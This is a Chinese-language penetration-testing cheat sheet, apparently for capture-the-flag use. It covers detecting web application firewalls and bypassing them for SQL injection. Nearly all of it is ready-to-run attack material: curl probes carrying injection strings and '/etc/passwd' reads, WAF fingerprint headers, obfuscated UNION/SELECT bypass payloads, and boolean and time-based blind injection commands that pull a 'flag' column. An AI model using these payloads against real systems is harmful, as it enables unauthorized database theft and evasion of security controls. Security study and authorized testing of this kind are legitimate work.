## 阶段一：WAF 检测与识别

### 1.1 判断是否有 WAF
```bash
# 发送明显恶意请求观察响应差异
curl -si "http://TARGET/?id=1' OR 1=1--"
curl -si "http://TARGET/?cmd=cat /etc/passwd"
curl -si "http://TARGET/" -A "sqlmap/1.0"

# 特征响应头
# Cloudflare: cf-ray, __cfduid
# ModSecurity: Mod_Security, NOYB
# AWS WAF: x-amzn-RequestId
# 阿里云盾: alicdn / aliwaf

# wafw00f（如果有安装）
wafw00f http://TARGET/
```

### 1.2 WAF 行为分析
```bash
# 逐步添加关键字，定位被拦截的关键词
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1"           # 正常 → 200
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1'"          # 单引号
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 union"     # union
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 select"    # select
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 union select"  # 组合
```

---

## 阶段二：SQL 注入 WAF 绕过

### 2.1 空格绕过
```sql
-- 注释替换
UNION/**/SELECT
UNION%0aSELECT
UNION%09SELECT
UNION%0dSELECT
UNION%a0SELECT

-- 括号替换空格
UNION(SELECT(1),(2),(3))
SELECT(group_concat(table_name))FROM(information_schema.tables)WHERE(table_schema=database())
```

### 2.2 关键词绕过
```sql
-- 大小写混合
uNiOn SeLeCt
UnIoN sElEcT

-- 双写绕过（WAF 只替换一次）
UNunionION SEselectLECT

-- 内联注释
/*!UNION*/ /*!SELECT*/
/*!50000UNION*/ /*!50000SELECT*/

-- 等价函数替换
-- information_schema → sys.schema_table_statistics (MySQL 5.7+)
-- concat → concat_ws / group_concat
-- substr → mid / left / right
-- ascii → ord / hex
-- if → case when
```

### 2.3 引号绕过
```sql
-- 十六进制替代字符串
WHERE table_name=0x7573657273  -- 'users'

-- char 函数
WHERE table_name=CHAR(117,115,101,114,115)

-- 反引号
SELECT `flag` FROM `flags`
```

### 2.4 数字型注入（无需引号）
```bash
# 布尔盲注 — 无需 union
curl -s "http://TARGET/?id=1 AND (SELECT LENGTH(flag) FROM flags LIMIT 1)>20"
curl -s "http://TARGET/?id=1 AND (SELECT ASCII(MID(flag,1,1)) FROM flags LIMIT 1)>100"

# 时间盲注
curl -s "http://TARGET/?id=1 AND IF(ASCII(MID((SELECT flag FROM flags LIMIT 1),1,1))>100,SLEEP(3),0)"
```

---

